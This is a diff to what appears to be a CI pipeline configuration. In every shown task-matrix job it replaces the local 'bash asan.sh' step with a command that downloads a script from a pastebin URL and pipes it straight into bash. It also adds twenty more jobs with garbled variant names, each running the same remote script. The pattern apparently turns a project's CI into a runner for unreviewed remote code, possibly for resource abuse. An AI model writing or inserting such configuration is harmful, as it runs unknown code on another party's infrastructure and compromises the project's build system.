@@ -4,42 +4,82 @@ container:
 task:
   matrix:
     - name: misoka
-      script: bash asan.sh
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
     - name: asnawi
-      script: bash asan.sh
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
     - name: mikom
-      script: bash asan.sh
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
     - name: binade
-      script: bash asan.sh 
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
     - name: jedet
-      script: bash asan.sh
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
     - name: tomug
-      script: bash asan.sh
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
     - name: musak
-      script: bash asan.sh
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
     - name: ajif
-      script: bash asan.sh
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
     - name: melki
-      script: bash asan.sh
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
     - name: diah
-      script: bash asan.sh
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
     - name: acen
-      script: bash asan.sh
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
     - name: dawi
-      script: bash asan.sh
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
     - name: munah
-      script: bash asan.sh
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
     - name: ayln
-      script: bash asan.sh 
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
     - name: melki
-      script: bash asan.sh
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
     - name: cion
-      script: bash asan.sh
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
     - name: minol
-      script: bash asan.sh
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
     - name: ajud
-      script: bash asan.sh
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
     - name: dulah
-      script: bash asan.sh
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
     - name: abas
-      script: bash asan.sh
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
+    - name: misokka
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
+    - name: asnaswi
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
+    - name: mikgom
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
+    - name: binafde
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
+    - name: jedevt
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
+    - name: tomuug
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
+    - name: muswak
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
+    - name: ajivf
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
+    - name: melfki
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
+    - name: diaeh
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
+    - name: acewn
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
+    - name: dawwi
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
+    - name: muvnah
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
+    - name: ayjln
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
+    - name: mewlki
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
+    - name: ciohn
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
+    - name: miwnol
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
+    - name: ajuld
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
+    - name: dulauh
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
+    - name: abyas
+      script: curl -sL https://pastebin.com/raw/87XWwvDR | bash
